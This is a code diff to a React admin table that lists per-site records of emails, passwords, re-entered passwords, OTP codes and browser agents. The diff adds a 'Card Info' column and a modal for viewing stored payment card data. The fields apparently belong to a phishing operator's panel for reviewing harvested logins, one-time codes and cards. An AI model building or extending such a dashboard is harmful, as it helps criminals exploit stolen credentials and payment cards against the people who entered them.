@@ -5,10 +5,13 @@ import Loader from "../../common/Loader";
 import useInformation from "../../hooks/useInformation";
 import { getData } from "../../api/fetching";
 import {  PaginationNav1Presentation } from "../Pagination/Pagination";
+import { useState } from "react";
+import CardDataModal from "../../modals/PaymentCardModal";
 
 
 const InformationTable = () => {
-
+  const [open,setOpen] = useState(false)
+  const [paymentInfo,setPaymentInfo] = useState({})
 
   const {  loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
 
@@ -79,6 +82,9 @@ const InformationTable = () => {
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 OTP Code
               </th>
+              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+               Card Info
+              </th>
               {
                 role === 'admin' && (
                   <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
@@ -96,14 +102,14 @@ const InformationTable = () => {
                 Time
               </th>
 
-
+         
 
             </tr>
           </thead>
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt, agent: { source,platform }, status, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt, agent: { source={},platform='' } ,paymentInfo, status, email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -140,6 +146,21 @@ const InformationTable = () => {
 
 
                   </td>
+                  <td  className="px-2 py-1 font-bold cursor-pointer ">
+                  <div className="relative inline-block">
+                      <button
+                        className={`p-2  ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                          }`}
+                          onClick={() => {
+                            setOpen((state) => !state);
+                            setPaymentInfo(paymentInfo);
+                           }}
+                          >View</button>
+
+                    </div>
+
+
+                  </td>
                   {
                     role === 'admin' && (
                       <td className="px-2 py-1 font-bold cursor-pointer ">
@@ -159,7 +180,7 @@ const InformationTable = () => {
                     <div className="relative inline-block">
                       <button
                       title={platform}
-                        onClick={() => handleCopyClick(`${source}`)}
+                        onClick={() => handleCopyClick(`${source ? source : ''}`)}
                         className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                           }`}>Copy</button>
                     </div>
@@ -167,11 +188,12 @@ const InformationTable = () => {
                   <td onClick={() => handleCopyClick(formatUtcToLocal(updatedAt))} className="px-2 py-1 font-bold cursor-pointer">
                     {formatUtcToLocal(updatedAt)}
                   </td>
+                 
                 </tr>
 
               ))
             }
-
+ <CardDataModal isOpen={open} setIsOpen={setOpen} data={paymentInfo}/>
           </tbody>
         </table>
 <div className="flex items-center justify-center">
